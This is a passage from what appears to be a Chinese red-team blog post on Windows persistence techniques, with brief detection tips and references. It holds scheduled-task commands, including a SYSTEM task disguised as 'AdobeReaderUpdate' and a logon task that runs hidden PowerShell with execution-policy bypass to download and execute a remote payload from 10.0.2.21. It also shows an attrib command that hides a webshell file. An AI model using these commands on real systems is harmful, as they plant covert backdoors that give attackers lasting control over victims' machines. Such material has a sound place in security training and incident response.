<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1:00        # 指定任务运行时间，24小时制。</span><br><span class="line">&#x2F;every      # 将任务安排为在指定的一天或一周的某一天或一个月的某一天运行</span><br><span class="line">MyDoor.bat  # 指定命令、程序(.exe或.com)或批处理程序(.bat或.cmd文件)。 </span><br></pre></td></tr></table></figure>

<h3 id="schtasks-win7-2008"><a href="#schtasks-win7-2008" class="headerlink" title="schtasks[win7/2008+]"></a>schtasks[win7/2008+]</h3><p>所需权限：Administrators</p>
<p>示例1，计划每天凌晨8:00运行一次：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SCHTASKS &#x2F;Create &#x2F;RU &quot;SYSTEM&quot; &#x2F;tn &quot;AdobeReaderUpdate&quot; &#x2F;sc daily &#x2F;st 08:00 &#x2F;tr &quot;powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1&quot;</span><br></pre></td></tr></table></figure>
<p>参数解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;RU     # 用指定用户帐户的权限运行任务。默认情况下使用本地计算机的当前用户的权限运行。</span><br><span class="line">&#x2F;tn     # 指定任务的名称，系统上的每项任务都必须具有唯一的名称。</span><br><span class="line">&#x2F;sc     # 指定计划的运行频率</span><br><span class="line">&#x2F;tr     # 指定任务运行的程序或命令，即可执行文件、脚本文件或批处理文件的绝对路径。如果未添加路径，则默认该文件位于&lt;systemroot&gt;\System32目录下。</span><br></pre></td></tr></table></figure>

<p>示例2，每当任何用户登录时任务都将运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;tn PentestLab &#x2F;tr &quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;10.0.2.21:8080&#x2F;ZPWLywg&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onlogon &#x2F;ru System</span><br></pre></td></tr></table></figure>

<h3 id="排查-9"><a href="#排查-9" class="headerlink" title="排查"></a>排查</h3><p>工具：autoruns</p>
<h2 id="msf默认内置自动化维持功能"><a href="#msf默认内置自动化维持功能" class="headerlink" title="msf默认内置自动化维持功能"></a>msf默认内置自动化维持功能</h2><p>由于杀软，这样直接用基本没实际意义</p>
<h2 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h2><h3 id="attrib命令"><a href="#attrib命令" class="headerlink" title="attrib命令"></a>attrib命令</h3><p>attrib命令是Windows系统自带的，用来显示或更改文件属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">attrib +s +h myshell.php</span><br></pre></td></tr></table></figure>

<h4 id="排查-10"><a href="#排查-10" class="headerlink" title="排查"></a>排查</h4><p>attrib命令或扫描工具。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1].<a href="https://mp.weixin.qq.com/s/3Zi404RkP5zvnFkth-IcYQ">权限维持之打造不一样的映像劫持后门</a><br>[2].<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">渗透技巧——Windows系统的帐户隐藏</a><br>[3].<a href="https://pentestlab.blog/methodologies/red-teaming/persistence/">Persistence_red-teaming_persistence</a><br>[4].<a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC2%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">第2篇：Windows权限维持–后门篇</a><br>[5].<a href="http://sh1yan.top/2019/06/29/Principle-and-Practice-of-COM-Component-Hijacking/">COM组件劫持原理与实践</a><br>[6].<a href="http://blog.topsec.com.cn/attack%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/">ATT&amp;CK之后门持久化</a></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>redteam</tag>
      </tags>
  </entry>
</search>
